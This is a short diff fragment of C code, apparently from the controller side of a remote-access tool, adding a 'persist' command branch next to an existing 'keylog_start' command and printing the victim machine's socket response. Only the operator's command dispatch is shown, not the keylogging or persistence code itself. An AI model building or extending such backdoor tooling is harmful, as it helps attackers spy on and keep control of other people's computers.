@@ -44,6 +44,9 @@ int main(){
             continue;
         } else if(strncmp("keylog_start", buffer, 12) == 0){
             continue;
+        }  else if(strncmp("persist", buffer, 7) == 0){
+            recv(client_socket, response, sizeof(response), 0);
+            printf("%s", response);
         } else {
             recv(client_socket, response, sizeof(response), MSG_WAITALL);
             printf("%s", response);
